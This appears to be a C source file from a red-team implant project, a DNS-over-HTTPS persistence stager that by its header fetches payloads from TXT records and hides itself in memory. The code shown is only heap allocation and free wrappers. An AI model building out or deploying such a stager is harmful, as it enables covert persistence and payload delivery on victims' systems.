/*-
 *
 * dns over http(s) persistence stager.
 * grabs a binary payload over a txt
 * record before going back to sleep
 * for a specified time.
 *
 * before going to sleep, it will try
 * to obfuscate itself in memory and
 * hide its return address.
 *
 * Copyright (c) 2021 Austin Hudson
 * Copyright (c) 2021 GuidePoint Security LLC
 *
-*/

#include "common.h"

D_SEC(B) PVOID NtMemAlloc( PINSTANCE Ins, ULONG Len )
{
	return
	Ins->nt.RtlAllocateHeap(
		NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap,
		HEAP_ZERO_MEMORY,
		Len
		);
};

D_SEC(B) BOOL NtMemFree( PINSTANCE Ins, PVOID Ptr )
{
	return
	Ins->nt.RtlFreeHeap(
		NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap,
		0,
		Ptr
		);
};
